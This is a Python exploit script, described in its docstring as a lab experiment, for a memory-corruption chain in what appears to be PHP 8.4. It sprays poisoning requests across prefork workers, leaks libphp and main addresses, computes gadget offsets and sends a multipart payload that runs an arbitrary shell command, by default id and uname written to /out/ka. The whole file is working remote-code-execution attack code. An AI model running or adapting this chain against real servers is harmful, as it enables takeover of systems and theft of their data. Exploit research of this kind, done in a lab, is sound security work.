#!/usr/bin/env python3
"""Multi-worker poisoning experiment for the 8.4.26 pure chain.

A1 closes its connection but leaves the child alive with a stale PS(id).
A2 closes its connection but leaves the child alive with a dangling
PS(http_session_vars). Both are per-child states.

Idea: spray A1 concurrently across the worker pool so every child is
poisoned, then B1 can leak from any child. Spray A2 concurrently so every
child is poisoned, then B2 can execute from any child. The B1-derived
libphp/main addresses are inherited from the prefork master and are shared
by all children.

This is a lab experiment, not yet part of the single-worker official tool.

usage:
  python3 poison_chain.py --port 18112 --workers 4
  python3 poison_chain.py --port 18112 --workers 8 --rounds 3
"""
from __future__ import annotations

import argparse
import concurrent.futures
import os
import socket
import struct
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.dirname(HERE)
PAYLOADS = os.path.join(LAB, "payloads")
sys.path.insert(0, HERE)
sys.path.insert(0, PAYLOADS)

import keepalive_probe as k  # type: ignore
from cheap_oom_a import build_body as build_a2  # type: ignore
from mk_ht import build as build_ht  # type: ignore
from fake_ref_b import make_spray, make_name  # type: ignore


def send_a1(host: str, port: int, body: bytes, timeout: float = 180.0) -> str:
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        k.send_chunked(s, host, port, "/index.php" + k.Q, body,
                       keep_alive=False)
        st, hd, bd, _ = k.read_response(s, b"", timeout=timeout)
        return st
    except Exception as exc:
        return "ERR %r" % (exc,)
    finally:
        s.close()


def send_a2(host: str, port: int, body: bytes, timeout: float = 180.0) -> str:
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        k.send_plain(s, host, port, "/index.php", body, keep_alive=False)
        st, hd, bd, _ = k.read_response(s, b"", timeout=timeout)
        return st
    except Exception as exc:
        return "ERR %r" % (exc,)
    finally:
        s.close()


def send_b1(host: str, port: int, body: bytes, timeout: float = 240.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        k.send_chunked(s, host, port, "/index.php", body, keep_alive=False)
        st, hd, bd, buf = k.read_response(s, b"", timeout=timeout)
        leak = k.parse_leak(hd)
        return st, hd, leak
    finally:
        s.close()


def send_b2(host: str, port: int, body: bytes, timeout: float = 180.0):
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        k.send_plain(s, host, port, "/index.php", body, keep_alive=False)
        st, hd, bd, buf = k.read_response(s, b"", timeout=timeout)
        return st, hd
    finally:
        s.close()


def build_b2(s: int, zif: int, cmd: bytes) -> bytes:
    ht = build_ht(s, zif, cmd, 384)
    spray = make_spray(384, s, 1, 0x0107, 8, 32)

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + k.BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(500):
        body += part(make_name(b"s", i, 10), spray)
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(495):
        body += part(make_name(b"t", i, 10), spray)
    body += b"--" + k.BOUNDARY + b"--\r\n"
    return bytes(body)


def main_chunk(leak):
    dec, zdtor, buckets = leak
    lib = zdtor - 0x65EB60
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - 87), bc[1]))
    return dec, zdtor, buckets, lib, cands


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18112)
    ap.add_argument("--workers", type=int, default=4,
                    help="number of concurrent A1/A2 poison requests")
    ap.add_argument("--rounds", type=int, default=3)
    ap.add_argument("--cmd", default="rm -f /out/ka; (id; uname -a) > /out/ka 2>&1")
    args = ap.parse_args()
    proof = os.path.join(LAB, "multi-out", "ka")

    tmp = tempfile.mkdtemp(prefix="p2s-poison-")
    try:
        a1 = k.generate_a1(tmp)
        b1 = k.generate_b1(tmp)
        a2 = build_a2(880, 64, 115, b"a" * 32, b"k0", k.BOUNDARY)
        print("bodies: A1=%d B1=%d A2=%d" % (len(a1), len(b1), len(a2)))

        leak = None
        for rnd in range(1, args.rounds + 1):
            print("=== round %d: poison %d workers with A1 ==="
                  % (rnd, args.workers))
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
                futs = [ex.submit(send_a1, args.host, args.port, a1)
                        for _ in range(args.workers)]
                for i, f in enumerate(concurrent.futures.as_completed(futs), 1):
                    print("  A1[%d] %s" % (i, f.result()))

            print("=== round %d: B1 leak on any poisoned child ===" % rnd)
            try:
                st, hd, leak = send_b1(args.host, args.port, b1)
                print("  B1 status=%r cookie=%d leak=%s"
                      % (st[:40], len(hd.get(b"set-cookie", b"")),
                         "yes" if leak else "no"))
            except Exception as exc:
                print("  B1 failed: %r" % (exc,))
                leak = None
            if leak:
                break

        if not leak:
            print("no B1 leak after %d rounds" % args.rounds)
            return 1

        dec, zdtor, buckets, lib, cands = main_chunk(leak)
        print("leak: decoded=%d zdtor=%#x libphp=%#x" % (len(dec), zdtor, lib))
        print("buckets:", [(hex(b), c) for b, c in buckets.most_common(6)])
        if not cands:
            print("no main candidate")
            return 1
        main = cands[0][0]
        s_addr = main + 0xF8398
        zif = lib + 0x465370
        print("main=%#x S=%#x zif=%#x cands=%s"
              % (main, s_addr, zif,
                 [(hex(b), c) for b, c in cands[:3]]))

        print("=== poison %d workers with A2 ===" % args.workers)
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = [ex.submit(send_a2, args.host, args.port, a2)
                    for _ in range(args.workers)]
            for i, f in enumerate(concurrent.futures.as_completed(futs), 1):
                print("  A2[%d] %s" % (i, f.result()))

        b2 = build_b2(s_addr, zif, args.cmd.encode())
        print("B2 bytes=%d" % len(b2))
        for attempt in range(1, 4):
            print("=== B2 attempt %d ===" % attempt)
            try:
                st, hd = send_b2(args.host, args.port, b2)
                print("  B2 status=%r conn=%r"
                      % (st[:40], hd.get(b"connection", b"")))
            except Exception as exc:
                print("  B2 failed: %r" % (exc,))
            time.sleep(0.5)
            if os.path.exists(proof):
                print("PROOF %s:" % proof)
                print(open(proof, "r", errors="replace").read())
                return 0
            print("  no proof yet; re-poisoning A2")
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
                futs = [ex.submit(send_a2, args.host, args.port, a2)
                        for _ in range(args.workers)]
                for f in concurrent.futures.as_completed(futs):
                    f.result()
        print("no proof after retries")
        return 1
    finally:
        import shutil
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
